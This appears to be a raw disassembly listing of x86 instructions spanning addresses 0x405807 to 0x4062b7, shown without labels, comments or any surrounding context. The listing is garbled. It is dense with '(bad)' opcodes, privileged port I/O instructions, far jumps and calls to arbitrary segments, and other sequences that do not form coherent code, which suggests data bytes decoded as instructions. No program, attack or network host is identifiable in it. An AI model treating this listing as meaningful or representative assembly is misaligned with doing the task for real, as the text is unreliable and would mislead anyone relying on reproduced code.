  405807:	outs   dx,DWORD PTR ds:[esi]
  405808:	bound  ebp,QWORD PTR [ebx-0x33a3901a]
  40580e:	lea    ecx,[ebx]
  405810:	shl    DWORD PTR [edi-0x362990d1],1
  405816:	mov    bl,0x67
  405818:	shr    DWORD PTR [ebx],0x2
  40581b:	pop    esp
  40581c:	jmp    0xbe9fdb9d
  405821:	dec    edi
  405822:	push   ss
  405823:	fucomip st,st(1)
  405825:	fist   DWORD PTR [esp+ebp*2-0x16fe3652]
  40582c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40582d:	(bad)  
  40582f:	sbb    DWORD PTR [esi+0x329ac5c9],0xffffffbb
  405836:	cld    
  405837:	arpl   cx,bp
  405839:	cs mov ch,0x7f
  40583c:	push   ds
  40583d:	jge    0x40583f
	...
  405867:	add    BYTE PTR [ebx+0x63],bl
  40586a:	xchg   edx,eax
  40586b:	repz push 0x4bef0082
  405871:	push   ss
  405872:	add    DWORD PTR [ecx+0x3f],esp
  405875:	push   ss
  405876:	and    BYTE PTR [esi],0x42
  405879:	call   0x16b71772
  40587e:	adc    BYTE PTR [esi],0x62
  405881:	out    0xe9,eax
  405883:	imul   esi,DWORD PTR [edi],0xc24c7460
  405889:	or     dh,BYTE PTR cs:[ebp-0x1fc02463]
  405890:	stc    
  405891:	xchg   ecx,eax
  405892:	mov    ebp,DWORD PTR [ebp+eax*4-0x6a0e8a93]
  405899:	jae    0x405876
  40589b:	jmp    0xea3932dd
  4058a0:	(bad)  
  4058a2:	or     BYTE PTR [ebp+0x7d206e35],0x68
  4058a9:	out    dx,al
  4058aa:	jnp    0x40586d
  4058ac:	xchg   BYTE PTR [eax+0x74],ah
  4058af:	out    0xbd,eax
  4058b1:	out    dx,eax
  4058b2:	aaa    
  4058b3:	out    dx,al
  4058b4:	inc    ebx
  4058b5:	jmp    0xf0ff:0x33816906
  4058bc:	adc    BYTE PTR [esi-0x3a],0x2d
  4058c0:	cmp    ch,BYTE PTR [esi+0x0]
  4058c3:	ret    0x823b
  4058c6:	add    dl,dl
  4058c8:	ror    DWORD PTR ds:0xabc9,1
	...
  4058f6:	adc    DWORD PTR [esi+0x54],ebp
  4058f9:	(bad)  
  4058fb:	fld    st(4)
  4058fd:	lds    ecx,FWORD PTR [edx-0x26]
  405900:	cmp    eax,0x1c3a69
  405905:	jmp    0xd4c3a28b
  40590a:	imul   esp,DWORD PTR [edx],0xe73de941
  405910:	or     BYTE PTR [eax],al
  405912:	fs push ebp
  405914:	ins    BYTE PTR es:[edi],dx
  405915:	dec    ebx
  405916:	es push edi
  405918:	add    BYTE PTR [ebp-0x28],dh
  40591b:	dec    esi
  40591c:	rcr    BYTE PTR [ebx-0x62],0x97
  405920:	or     BYTE PTR [eax],al
  405922:	dec    esp
  405923:	rol    bh,0x45
  405926:	or     ebx,DWORD PTR [edx+0x0]
  405929:	add    BYTE PTR [edi-0x1807bb1c],dl
  40592f:	mov    ds:0x596d0875,al
  405934:	call   DWORD PTR ds:0x412f27
  40593a:	pushf  
  40593b:	cdq    
  40593c:	je     0x405999
  40593e:	call   DWORD PTR [eax-0x1198ff25]
  405944:	iret   
  405945:	lea    ebx,[edx+0x776a509d]
  40594b:	daa    
  40594c:	call   DWORD PTR ds:0x412ee3
  405952:	dec    esp
  405953:	cdq    
  405954:	je     0x40597f
  405956:	sbb    BYTE PTR ds:0x1e4,ch
	...
  405984:	push   edi
  405985:	pop    ecx
  405986:	add    bh,bh
  405988:	retf   0x8fa1
  40598b:	inc    ebp
  40598c:	setne  BYTE PTR [ebp-0x4]
  405990:	mov    al,ds:0x9283ec1a
  405995:	jae    0x405996
  405997:	jae    0x4059b7
  405999:	scas   al,BYTE PTR es:[edi]
  40599a:	inc    ebp
  40599b:	lock and eax,0xec000059
  4059a1:	ins    BYTE PTR es:[edi],dx
  4059a2:	mov    BYTE PTR [ebp-0x39],0x57
  4059a6:	add    BYTE PTR [eax],al
  4059a8:	pop    ss
  4059a9:	adc    eax,DWORD PTR [eax]
  4059ab:	push   0xffffffe7
  4059ad:	adc    dl,BYTE PTR [eax]
  4059af:	lea    ebx,[edx]
  4059b1:	jnp    0x405a03
  4059b3:	push   0x3e
  4059b5:	add    dh,0x75
  4059b8:	jmp    0x443:0x8583f1dd
  4059bf:	or     edi,esi
  4059c1:	data16 add al,0x43
  4059c4:	mov    ebp,0x4a00cf67
  4059c9:	jp     0x405991
  4059cb:	jne    0x40597f
  4059cd:	or     bh,cl
  4059cf:	fidivr DWORD PTR [esi]
  4059d1:	cmp    BYTE PTR [edx-0x3d],0x5
  4059d5:	cmp    eax,edx
  4059d7:	or     BYTE PTR [esi],bh
  4059d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059da:	jp     0x4059c8
  4059dc:	cdq    
  4059dd:	scas   eax,DWORD PTR es:[edi]
  4059de:	sti    
  4059df:	out    0x39,eax
  4059e1:	cmp    DWORD PTR [eax+eax*1],eax
  4059e4:	(bad)  
  4059e5:	rcr    ebx,1
  4059e7:	inc    ecx
	...
  405a10:	add    BYTE PTR [eax],al
  405a12:	mov    ?,WORD PTR ds:0xcf7950c7
  405a18:	sti    
  405a19:	dec    edi
  405a1a:	data16 data16 stos BYTE PTR es:[edi],al
  405a1d:	add    BYTE PTR [esi],bh
  405a1f:	stos   BYTE PTR es:[edi],al
  405a20:	mov    esp,0x30823ac2
  405a25:	mov    ebp,DWORD PTR [edx+0x1]
  405a28:	sar    ah,0xed
  405a2b:	add    BYTE PTR [ecx+0x8],cl
  405a2e:	ds out dx,eax
  405a30:	std    
  405a31:	sub    bh,BYTE PTR [esi-0x37]
  405a34:	mov    esp,0x1a8246c2
  405a39:	(bad)  [edx+eax*4-0x7d6bffa7]
  405a40:	pop    ecx
  405a41:	add    BYTE PTR [ecx],ah
  405a43:	pop    es
  405a44:	clc    
  405a45:	(bad)  
  405a46:	xchg   ebx,eax
  405a47:	push   0x59
  405a49:	add    BYTE PTR [edx+eax*4-0x7e1ac925],ah
  405a50:	add    ecx,DWORD PTR [ebx]
  405a52:	(bad)  
  405a53:	and    eax,0x5b838910
  405a58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a59:	(bad)  
  405a5a:	imul   ebp,DWORD PTR [edi-0x6f],0xffffffcd
  405a5e:	fldcw  WORD PTR [ebx-0x6a]
  405a61:	cli    
  405a62:	mov    eax,ds:0xf67ac3e6
  405a67:	add    cl,ch
  405a69:	pop    ecx
  405a6a:	ds ins BYTE PTR es:[edi],dx
  405a6c:	hlt    
  405a6d:	(bad)  
  405a6e:	ins    DWORD PTR es:[edi],dx
  405a6f:	ins    BYTE PTR es:[edi],dx
  405a70:	cld    
  405a71:	test   eax,0x59e0e5
	...
  405a9f:	add    BYTE PTR [esi],bh
  405aa1:	add    ecx,ebp
  405aa3:	fild   DWORD PTR [eax+edx*4-0x17]
  405aa7:	add    esi,DWORD PTR ds:0xcfbdc9b
  405aad:	adc    DWORD PTR [ecx+0x126b99d6],0xffffffab
  405ab4:	lds    edx,FWORD PTR [edi+0x627cbca2]
  405aba:	jmp    0xc3bf0fef
  405abf:	(bad)  
  405ac0:	jns    0x405aa7
  405ac2:	lock fstp TBYTE PTR [ecx+0x77c61e6b]
  405ac9:	cwde   
  405aca:	in     eax,dx
  405acb:	add    ecx,DWORD PTR [ebx]
  405acd:	loopne 0x405acc
  405acf:	sbb    ebx,0x384fe95e
  405ad5:	fdivr  DWORD PTR [ebx+edi*8+0x49]
  405ad9:	out    0xee,al
  405adb:	sbb    bh,BYTE PTR [esi-0x5f]
  405ade:	sub    edi,ebx
  405ae0:	cmp    ebp,esi
  405ae2:	call   0xde9806ab
  405ae7:	dec    edi
  405ae8:	ss jae 0x405a9a
  405aeb:	test   eax,0xc3e25b3e
  405af0:	xchg   edx,eax
  405af1:	dec    ebx
  405af2:	cwde   
  405af3:	push   edi
  405af4:	inc    edx
  405af5:	push   0x34
  405af7:	clc    
  405af8:	or     cl,dh
  405afa:	jmp    eax
  405afc:	in     eax,0x1a
  405afe:	jmp    FWORD PTR [esi+0x72187703]
	...
  405b2c:	add    BYTE PTR [eax],al
  405b2e:	xor    DWORD PTR [edi+0x40],edx
  405b31:	cmp    DWORD PTR [edx],ecx
  405b33:	icebp  
  405b34:	out    dx,al
  405b35:	xchg   esi,eax
  405b36:	sti    
  405b37:	or     edi,edi
  405b39:	adc    al,0xd6
  405b3b:	sbb    bh,bh
  405b3d:	cld    
  405b3e:	aad    0x82
  405b40:	lahf   
  405b41:	mov    es,WORD PTR [ebx]
  405b43:	imul   ebx,DWORD PTR [eax-0x60],0xfffffffc
  405b47:	push   ebx
  405b48:	add    BYTE PTR [edi+esi*1],dl
  405b4b:	ja     0x405ba3
  405b4d:	mov    esi,0xf17dde6e
  405b52:	cmp    eax,0x7a0208f0
  405b57:	push   es
  405b58:	pop    edi
  405b59:	scas   eax,DWORD PTR es:[edi]
  405b5a:	aam    0x9d
  405b5c:	or     cl,ch
  405b5e:	push   ss
  405b5f:	and    BYTE PTR [edx+ebp*2],cl
  405b62:	mov    ds:0xee290b5c,al
  405b67:	push   ebx
  405b68:	sub    ebp,DWORD PTR [ecx]
  405b6a:	daa    
  405b6b:	or     bl,BYTE PTR [esi+0x30]
  405b6e:	jl     0x405bc3
  405b70:	add    BYTE PTR [edx+0x21],dh
  405b73:	push   edi
  405b74:	mov    ebx,DWORD PTR [ebp+eiz*2+0x702fed5]
  405b7b:	add    DWORD PTR [ebx+0x3067bdef],ecx
  405b81:	jnp    0x405bca
  405b83:	jmp    0xfd80:0x5ff2b0fb
  405b8a:	dec    ebp
  405b8b:	jbe    0x405bba
  405b8d:	imul   edi,ecx,0xec721b
	...
  405bbb:	add    BYTE PTR [ebp+0x225e4666],bh
  405bc1:	jmp    0xa:0x9ec228eb
  405bc8:	in     al,dx
  405bc9:	jb     0x405c4a
  405bcb:	cld    
  405bcc:	jbe    0x405bdb
  405bce:	or     eax,0x7707cb80
  405bd3:	or     BYTE PTR [edi-0x6e],ah
  405bd6:	popa   
  405bd7:	and    BYTE PTR [ebx+0xc09ea63],0x9e
  405bde:	pop    ebx
  405bdf:	pop    edi
  405be0:	sub    DWORD PTR [esi+0x61e708c2],esp
  405be6:	xor    BYTE PTR [edx-0x31],dh
  405be9:	popa   
  405bea:	cmp    DWORD PTR [edi-0x1d],esi
  405bed:	push   ecx
  405bee:	xor    bl,ch
  405bf0:	repnz popa 
  405bf2:	inc    ecx
  405bf3:	jb     0x405b92
  405bf5:	popa   
  405bf6:	inc    esi
  405bf7:	ja     0x405b9a
  405bf9:	push   ecx
  405bfa:	inc    ecx
  405bfb:	add    al,0xad
  405bfd:	adc    BYTE PTR [edi],0x3c
  405c00:	jbe    0x405c0d
  405c02:	or     bh,BYTE PTR [ecx+eax*4]
  405c05:	push   ss
  405c06:	push   es
  405c07:	sub    al,0x86
  405c09:	imul   ecx,DWORD PTR [ecx],0xc0428eeb
  405c0f:	pop    ebx
  405c10:	test   al,0x3f
  405c12:	leave  
  405c13:	ret    0x5d5f
  405c16:	shl    al,0x63
  405c19:	arpl   bx,ax
  405c1b:	stos   BYTE PTR es:[edi],al
  405c1c:	lods   al,BYTE PTR ds:[esi]
  405c1d:	and    al,BYTE PTR [ebx+0xc6]
	...
  405c47:	add    BYTE PTR [eax],al
  405c49:	add    BYTE PTR [ebp+0x62],dl
  405c4c:	fidiv  DWORD PTR [ebp-0x1a]
  405c4f:	aad    0x1
  405c51:	add    BYTE PTR [edi+0x5d],ah
  405c54:	pop    ebx
  405c55:	pop    edi
  405c56:	test   eax,0x5708c2a4
  405c5b:	ss push ebx
  405c5d:	push   eax
  405c5e:	iret   
  405c5f:	add    al,0x1f
  405c61:	sub    ah,BYTE PTR [edi+0x5f]
  405c64:	clc    
  405c65:	jb     0x405c7d
  405c67:	mov    ds:0x733ebbff,al
  405c6c:	add    eax,DWORD PTR [eax]
  405c6e:	fnstenv ds:[ecx]
  405c71:	dec    ebp
  405c72:	jg     0x405ce6
  405c74:	sub    eax,0x428a7101
  405c79:	std    
  405c7a:	add    DWORD PTR [edx+0x65fad7e7],esi
  405c80:	ret    
  405c81:	mov    ecx,0xffc3c1f1
  405c86:	in     al,dx
  405c87:	sbb    ah,bh
  405c89:	push   es
  405c8a:	imul   ebx,edx,0xffffff8f
  405c8d:	ret    
  405c8e:	jne    0x405cc9
  405c90:	(bad)  
  405c91:	push   ebp
  405c92:	(bad)
  405c95:	(bad)  
  405c96:	into   
  405c97:	inc    ebp
  405c98:	push   esp
  405c99:	pop    eax
  405c9a:	push   esi
  405c9b:	dec    ebx
  405c9c:	out    dx,al
  405c9d:	aas    
  405c9e:	ds jmp 0x3d87:0x17d0135
  405ca6:	sbb    ch,BYTE PTR [ebp-0x79c1ffbc]
  405cac:	adc    eax,0x83
	...
  405cd5:	add    BYTE PTR [eax],al
  405cd7:	add    BYTE PTR [ebx-0x72],bl
  405cda:	dec    esi
  405cdb:	inc    ecx
  405cdc:	ds jb  0x405d16
  405cdf:	or     DWORD PTR [ebp-0xb4c499],edi
  405ce5:	jno    0x405cea
  405ce7:	jne    0x405d2c
  405ce9:	pop    ebp
  405cea:	les    ebx,FWORD PTR [ebx-0x79]
  405ced:	xor    eax,0xd456daef
  405cf2:	fadd   QWORD PTR [eax]
  405cf4:	call   FWORD PTR ds:[eax-0x4]
  405cf8:	in     al,dx
  405cf9:	fisttp DWORD PTR [ebx]
  405cfb:	push   eax
  405cfc:	push   ecx
  405cfd:	xchg   DWORD PTR [edi],ebp
  405cff:	dec    ebx
  405d00:	push   DWORD PTR [ecx+0xe]
  405d03:	shl    BYTE PTR [ecx],0xf6
  405d06:	xchg   ebx,eax
  405d07:	add    BYTE PTR [esi],bh
  405d09:	jb     0x405cd5
  405d0b:	inc    ebp
  405d0c:	ss pop ebx
  405d0e:	jmp    0x6c9b9b16
  405d13:	dec    eax
  405d14:	or     eax,DWORD PTR es:[ebx+0x4]
  405d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d19:	pop    ebx
  405d1a:	inc    ebx
  405d1b:	add    eax,0xc2c4ee11
  405d20:	xor    ebp,edi
  405d22:	xor    DWORD PTR [ebp+0x3e],eax
  405d25:	push   esp
  405d26:	test   eax,0xf7736438
  405d2b:	fdivr  QWORD PTR [esi]
  405d2d:	pop    ebx
  405d2e:	push   0xffffffbb
  405d30:	fs out dx,al
  405d32:	or     BYTE PTR [edi+0x37e96363],al
  405d38:	je     0x405da2
  405d3a:	adc    al,0xbc
	...
  405d64:	add    BYTE PTR [eax],al
  405d66:	out    0x76,al
  405d68:	xchg   esp,eax
  405d69:	ret    0xd1c9
  405d6c:	and    al,0xb8
  405d6e:	mov    bl,0x1d
  405d70:	jno    0x405dc5
  405d72:	mov    ecx,0x2bc270ed
  405d77:	outs   dx,DWORD PTR ds:[esi]
  405d78:	rol    DWORD PTR [ecx+ebp*4],cl
  405d7b:	in     eax,dx
  405d7c:	pop    esp
  405d7d:	ret    0xef4b
  405d80:	mov    eax,ds:0x29543e44
  405d85:	aaa    
  405d86:	pusha  
  405d87:	aam    0xac
  405d89:	mov    bh,0xb5
  405d8b:	dec    edx
  405d8c:	ins    BYTE PTR es:[edi],dx
  405d8d:	dec    eax
  405d8e:	mov    cs,WORD PTR [edx]
  405d90:	fwait
  405d91:	ret    0xe353
  405d94:	mov    eax,ds:0x29543e44
  405d99:	aaa    
  405d9a:	inc    esp
  405d9b:	xrelease mov BYTE PTR [eax-0x1],dl
  405d9f:	pop    edx
  405da0:	push   ss
  405da1:	cmp    BYTE PTR [esi+0x72],cl
  405da4:	std    
  405da5:	fidivr DWORD PTR [esi]
  405da7:	pop    ebx
  405da8:	bnd ret 
  405daa:	rcr    DWORD PTR [ecx-0x56],cl
  405dad:	ret    0x6acb
  405db0:	add    BYTE PTR [ecx],al
  405db2:	jo     0x405d37
  405db4:	add    cl,ch
  405db6:	cld    
  405db7:	lock repz rol ebx,1
  405dbb:	js     0x405dbc
  405dbd:	fdivp  st(7),st
  405dbf:	lock sti 
  405dc1:	rol    DWORD PTR [ecx-0x3d16ff7d],0x9a
  405dc8:	pop    ebx
  405dc9:	mov    al,0x0
	...
  405df3:	add    BYTE PTR [ebx],al
  405df5:	adc    DWORD PTR [ebx-0x3f604233],ecx
  405dfb:	mov    bh,0xff
  405dfd:	push   bx
  405dff:	sbb    DWORD PTR [edx+0x7dd23ff3],edx
  405e05:	pop    ebx
  405e06:	clc    
  405e07:	sbb    edi,DWORD PTR ds:0xd96aff9a
  405e0d:	ss dec ebx
  405e0f:	sub    BYTE PTR [edx],bh
  405e11:	pop    ebx
  405e12:	je     0x405df6
  405e14:	ret    0x3428
  405e17:	xor    bh,BYTE PTR [ebp+0x5b]
  405e1a:	add    ch,bh
  405e1c:	push   ebx
  405e1d:	fidivr DWORD PTR ds:0x1c02fd
  405e23:	jmp    0x1cc3b299
  405e28:	push   0x12
  405e2a:	inc    ecx
  405e2b:	jmp    0x2454e6d
  405e30:	jp     0x405e34
  405e32:	leave  
  405e33:	sub    bl,BYTE PTR [ebx-0x722b007f]
  405e39:	adc    DWORD PTR [ecx-0x17],eax
  405e3c:	les    esp,FWORD PTR [eax]
  405e3e:	hlt    
  405e3f:	es mov ecx,0x7f26fe97
  405e45:	xor    eax,DWORD PTR [ecx]
  405e47:	jmp    0x83404f89
  405e4c:	inc    ebx
  405e4d:	jae    0x405ec2
  405e4f:	xor    DWORD PTR [edx],edi
  405e51:	pop    ebx
  405e52:	add    DWORD PTR [eax],0x3f
  405e55:	pushf  
  405e56:	je     0x405e5c
	...
  405e80:	add    BYTE PTR [eax],al
  405e82:	popa   
  405e83:	pop    ecx
  405e84:	add    BYTE PTR [eax],al
  405e86:	sahf   
  405e87:	fmulp  st(0),st
  405e89:	(bad)  
  405e8a:	and    BYTE PTR [ebx-0x640c7a73],bl
  405e90:	(bad)  
  405e91:	jmp    DWORD PTR [edi-0x64]
  405e94:	mov    ch,0xc8
  405e96:	icebp  
  405e97:	call   0x0:0x874fe8ff
  405e9e:	or     al,0x9a
  405ea0:	je     0x40b86a
  405ea6:	jg     0x405eb8
  405ea8:	dec    ebp
  405ea9:	inc    ecx
  405eaa:	out    0xd4,eax
  405eac:	test   eax,esi
  405eae:	mov    eax,ds:0xcf50ff9a
  405eb3:	push   cs
  405eb4:	fld    DWORD PTR [eax]
  405eb6:	out    0x56,eax
  405eb8:	ror    BYTE PTR [edi],0x5b
  405ebb:	lahf   
  405ebc:	add    BYTE PTR [eax],al
  405ebe:	xlat   BYTE PTR ds:[ebx]
  405ebf:	xchg   edx,eax
  405ec0:	test   esp,eax
  405ec2:	inc    ecx
  405ec3:	fwait
  405ec4:	inc    DWORD PTR [eax]
  405ec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ec7:	pop    ecx
  405ec8:	add    BYTE PTR [ebp-0x161e6],cl
  405ece:	and    BYTE PTR [edx],cl
  405ed0:	push   DWORD PTR [ebp-0x6395]
  405ed6:	lock dec esp
  405ed8:	xor    al,0x4b
  405eda:	out    0x59,al
  405edc:	mov    edx,DWORD PTR [ebp-0x63a5]
  405ee2:	mov    WORD PTR [ecx+0x840f],ds
	...
  405f10:	cvtps2pd xmm0,QWORD PTR [eax]
  405f13:	add    BYTE PTR [esp+ecx*1-0xc],ch
  405f17:	pminub mm1,mm2
  405f1a:	add    BYTE PTR [eax],al
  405f1c:	push   edi
  405f1d:	call   0xffc0:0x4e3ed4b5
  405f24:	in     al,0x73
  405f26:	sub    eax,DWORD PTR [eax]
  405f28:	ds je  0x405f30
  405f2b:	call   0x43ab79
  405f30:	inc    ebp
  405f31:	xor    dh,BYTE PTR [edi]
  405f33:	jns    0x405efc
  405f35:	mov    edi,0x7e838dbb
  405f3a:	push   esp
  405f3b:	push   0x17415
  405f40:	sbb    DWORD PTR [eax],ecx
  405f42:	mov    esp,0x4b262bff
  405f47:	inc    ecx
  405f48:	ds imul eax,ebx,0x39a56674
  405f4f:	cld    
  405f50:	stc    
  405f51:	xchg   DWORD PTR [ebx],esi
  405f53:	dec    ebx
  405f54:	jg     0x405fc8
  405f56:	or     al,al
  405f58:	jb     0x405fd5
  405f5a:	inc    edx
  405f5b:	(bad)  
  405f5c:	mov    ebx,0xd9ffbeb2
  405f61:	jb     0x405f66
  405f63:	add    BYTE PTR [esi],bh
  405f65:	pop    es
  405f66:	mov    eax,eax
  405f68:	enter  0xbfdd,0x50
  405f6c:	push   esi
  405f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f6e:	add    ecx,DWORD PTR [edi]
  405f70:	ficomp DWORD PTR ds:[ebx+0xd8]
	...
  405f9b:	add    BYTE PTR [eax],al
  405f9d:	add    BYTE PTR [esi],bh
  405f9f:	jb     0x405fab
  405fa1:	shl    BYTE PTR [ebx],0x67
  405fa4:	cmp    BYTE PTR [ebp-0x40fb82],0x3e
  405fab:	xchg   BYTE PTR [edi],cl
  405fad:	dec    ebx
  405faf:	xor    bh,BYTE PTR [esi+0x8ed89ff]
  405fb5:	scas   al,BYTE PTR es:[edi]
  405fb6:	div    BYTE PTR [edx+0x192deb03]
  405fbc:	sbb    bh,bh
  405fbe:	jmp    0x405ff5
  405fc0:	lods   al,BYTE PTR ds:[esi]
  405fc1:	lock nop
  405fc3:	pop    ebx
  405fc4:	jmp    0x212ec0cc
  405fc9:	lods   al,BYTE PTR ds:[esi]
  405fca:	data16 (bad) 
  405fcc:	jmp    0xe93c4d4
  405fd1:	cmp    DWORD PTR [esi+0x73],eax
  405fd4:	daa    
  405fd5:	(bad)  
  405fd6:	ds pop ebx
  405fd8:	ins    BYTE PTR es:[edi],dx
  405fd9:	mov    DWORD PTR [edx],ecx
  405fdb:	idiv   BYTE PTR gs:[esi-0x33cb9b72]
  405fe2:	sub    BYTE PTR [esi+eiz*8-0x55],ah
  405fe6:	nop
  405fe7:	mov    ecx,gs
  405fe9:	add    esp,DWORD PTR [edi]
  405feb:	pop    esi
  405fec:	(bad)  
  405fed:	mov    esi,0xcb946411
  405ff2:	or     BYTE PTR [esi+eax*8-0x55],ah
  405ff6:	ret    0xe98c
  405ff9:	add    eax,ebp
  405ffb:	xchg   edi,eax
  405ffc:	adc    cl,ch
  405ffe:	std    
  405fff:	or     eax,0xaf62
	...
  40602c:	mov    ebp,0x8d53959e
  406031:	or     bh,BYTE PTR [ebx]
  406033:	push   edi
  406034:	jo     0x406006
  406036:	sub    al,0x10
  406038:	ret    
  406039:	shr    BYTE PTR [ecx+0x3],cl
  40603c:	ds pop ebx
  40603e:	je     0x406057
  406040:	sti    
  406041:	pop    edx
  406042:	jmp    0x92109e4a
  406047:	mov    al,BYTE PTR [esi-0x48fa7e67]
  40604d:	sbb    eax,0x53238a55
  406052:	jmp    0x9d82:0x695b80bc
  406059:	and    eax,DWORD PTR [edx]
  40605b:	mov    ebx,0x32015fbd
  406060:	xor    BYTE PTR [eax+0x42],bl
  406063:	jnp    0x406063
  406065:	pop    edx
  406066:	add    cl,ch
  406068:	cmp    eax,0xa5eac330
  40606d:	arpl   WORD PTR [ebp+0x15],ax
  406070:	mov    dl,0xb
  406072:	cmp    BYTE PTR [esi+edx*1+0x6b],ch
  406076:	(bad)  
  406077:	out    dx,eax
  406078:	cmp    bh,BYTE PTR [eax]
  40607a:	inc    ebp
  40607b:	xchg   BYTE PTR [eax-0x2b8ffbe4],al
  406081:	xchg   ebp,eax
  406082:	out    dx,eax
  406083:	adc    DWORD PTR es:[ebx-0x2],0x15
  406088:	mov    bh,0xc3
  40608a:	(bad)  
  40608b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40608c:	cmp    ecx,ebp
  40608e:	push   ebx
  40608f:	sbb    eax,DWORD PTR [eax]
	...
  4060b9:	add    BYTE PTR [edx+0x62],cl
  4060bc:	jne    0x40608b
  4060be:	fucomi st,st(0)
  4060c0:	pop    es
  4060c1:	fs jns 0x40612f
  4060c4:	push   eax
  4060c5:	shl    DWORD PTR [ecx],0x5b
  4060c8:	add    cl,ch
  4060ca:	shl    DWORD PTR [esp+eax*1-0x74a4c217],0x34
  4060d2:	dec    edx
  4060d3:	outs   dx,BYTE PTR ds:[esi]
  4060d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060d5:	jnp    0x8282b9e0
  4060db:	xchg   esp,eax
  4060dc:	ret    0x3ded
  4060df:	or     BYTE PTR [ebx-0x368407b],cl
  4060e5:	aaa    
  4060e6:	jae    0x4060f3
  4060e8:	push   ebx
  4060e9:	sbb    BYTE PTR [esi+edx*8+0x75],ch
  4060ed:	in     eax,dx
  4060ee:	(bad)  
  4060ef:	loopne 0x4060f8
  4060f1:	(bad)  
  4060f2:	stc    
  4060f3:	dec    edx
  4060f4:	mov    DWORD PTR [esi+edi*2],esp
  4060f7:	(bad)  
  4060f8:	pop    es
  4060f9:	jb     0x4060fe
  4060fb:	push   edi
  4060fc:	mov    ebp,DWORD PTR [esi-0x1aa829bb]
  406102:	(bad)  
  406103:	xor    edx,DWORD PTR fs:[ebx-0x61]
  406107:	xor    eax,DWORD PTR gs:[eax]
  40610a:	std    
  40610b:	rol    DWORD PTR [edi+eax*1-0x28960581],1
  406112:	fs pop eax
  406114:	rol    eax,0x60
  406117:	pop    ebx
  406118:	ret    
  406119:	mov    ebx,DWORD PTR [esp+ebp*2]
  40611c:	clc    
  40611d:	and    eax,DWORD PTR [eax]
	...
  406147:	add    BYTE PTR [edi],bl
  406149:	ins    BYTE PTR es:[edi],dx
  40614a:	clc    
  40614b:	(bad)  
  40614c:	rol    DWORD PTR [edi+0x56],cl
  40614f:	mov    bh,0x20
  406151:	scas   eax,DWORD PTR es:[edi]
  406152:	add    edx,DWORD PTR [esi+0x53]
  406155:	popf   
  406156:	ret    0x240c
  406159:	mov    cs,WORD PTR [ebx+0x23a2f4f8]
  40615f:	cli    
  406160:	in     al,0xa2
  406162:	lea    ecx,[eax+ebp*1+0x43207083]
  406169:	pop    esp
  40616a:	dec    esi
  40616b:	or     dh,ah
  40616d:	pushf  
  40616e:	adc    DWORD PTR [ebx],eax
  406170:	fst    st(2)
  406172:	cli    
  406173:	xor    edi,edi
  406175:	jp     0x40616f
  406177:	xor    edi,edi
  406179:	rcr    BYTE PTR [edi+ebx*1-0x3e427007],1
  406180:	aam    0xff
  406182:	or     eax,ecx
  406184:	xchg   esp,eax
  406185:	inc    edi
  406186:	add    ebx,ecx
  406188:	dec    esp
  406189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40618a:	xor    edi,edx
  40618c:	add    al,0xa3
  40618e:	xor    edi,edx
  406190:	push   0xffffffda
  406192:	pop    es
  406193:	scas   eax,DWORD PTR es:[edi]
  406194:	enter  0xf521,0x3
  406198:	popa   
  406199:	inc    edi
  40619a:	rol    eax,0xa0
  40619d:	pop    edx
  40619e:	ret    
  40619f:	mov    ebp,DWORD PTR [ebx+ebp*2]
  4061a2:	clc    
  4061a3:	and    ebx,DWORD PTR [edi]
  4061a5:	imul   edi,eax,0xffffff8d
  4061a8:	adc    eax,DWORD PTR [edi+0x2a]
  4061ab:	mov    BYTE PTR [eax],0x0
	...
  4061d6:	ds icebp 
  4061d8:	inc    ebx
  4061d9:	add    esi,eax
  4061db:	addr16 ret 0x32c2
  4061df:	jne    0x4061b4
  4061e1:	mov    esi,DWORD PTR [esi+0x64]
  4061e4:	mov    eax,0xb8647423
  4061e9:	lea    edi,[edx+0x2e461080]
  4061ef:	or     al,0x0
  4061f1:	dec    esi
  4061f2:	ss xor eax,edx
  4061f5:	adc    DWORD PTR ds:0xdfa883e,edi
  4061fb:	dec    esp
  4061fc:	loopne 0x4061f6
  4061fe:	or     eax,0x599c8e5c
  406203:	jae    0x40619b
  406205:	inc    esi
  406206:	xor    esi,DWORD PTR [esi+0x5d]
  406209:	sbb    al,0xff
  40620b:	xor    eax,0xee070315
  406210:	mov    esp,0xbf561433
  406215:	xor    edx,DWORD PTR [eax+edi*8]
  406218:	jg     0x406221
  40621a:	out    0xea,al
  40621c:	sub    DWORD PTR [ecx+0x3d],0x30
  406220:	in     al,0xc0
  406222:	(bad)  
  406223:	jns    0x40622b
  406225:	ret    
  406226:	lds    ebp,FWORD PTR [ebp-0x55e20709]
  40622c:	idiv   eax
  40622e:	mov    bl,0xde
  406230:	adc    ch,BYTE PTR [edi+0x38f36d1]
  406236:	push   0xc2c48e
	...
  406263:	add    BYTE PTR [edx],bh
  406265:	jne    0x40623a
  406267:	mov    eax,esi
  406269:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40626a:	mov    esi,0xbea5b423
  40626f:	(bad)  
  406270:	ret    0x7479
  406273:	pop    ebx
  406274:	test   eax,0x564e06f1
  406279:	pop    ebx
  40627a:	sub    ch,al
  40627c:	das    
  40627d:	pop    esp
  40627e:	xor    ecx,DWORD PTR [edi-0x18aed36c]
  406284:	xchg   BYTE PTR [ecx+edx*2],ch
  406287:	mov    DWORD PTR [edx+0x1ad38740],esp
  40628d:	shr    dl,cl
  40628f:	pop    ecx
  406290:	and    bl,BYTE PTR [edx-0x7dc2edd6]
  406296:	bound  edi,QWORD PTR [ebp-0x41359ad3]
  40629c:	or     eax,0x39806c65
  4062a1:	cmp    eax,0x5bd593f8
  4062a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062a7:	repz jle 0x406245
  4062aa:	out    dx,al
  4062ab:	push   es
  4062ac:	std    
  4062ad:	rol    DWORD PTR [edx],cl
  4062af:	div    DWORD PTR [esi]
  4062b1:	cmp    al,0xf1
  4062b3:	mul    BYTE PTR [esi]
  4062b5:	into   
  4062b6:	push   ebp
  4062b7:	adc    ecx,ebp
